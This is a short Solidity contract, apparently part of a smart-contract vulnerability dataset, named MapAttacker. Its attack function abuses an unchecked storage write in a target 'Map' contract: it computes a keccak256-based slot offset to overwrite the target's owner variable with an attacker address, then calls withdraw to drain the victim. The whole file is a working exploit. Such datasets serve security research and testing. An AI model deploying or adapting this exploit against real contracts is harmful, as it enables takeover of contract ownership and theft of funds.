 pragma solidity ^0.4.24;

import "../dataset/access_control/mapping_write.sol";

contract MapAttacker {
    Map public target;

    constructor(address _target) public {
        target = Map(_target);
    }

    function attack(address new_owner) public {
        uint256 key = 2 ** 256 - 2;
        uint256 value = 0;
        target.set(key, value);

        uint256 slotIndex = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 overwriteIndex = 2**256 -1 - slotIndex + 1;

        target.set(overwriteIndex, uint(new_owner));
    }

    function withdraw_from_victim() public {
        target.withdraw();
    }

    function () public payable {
    }
}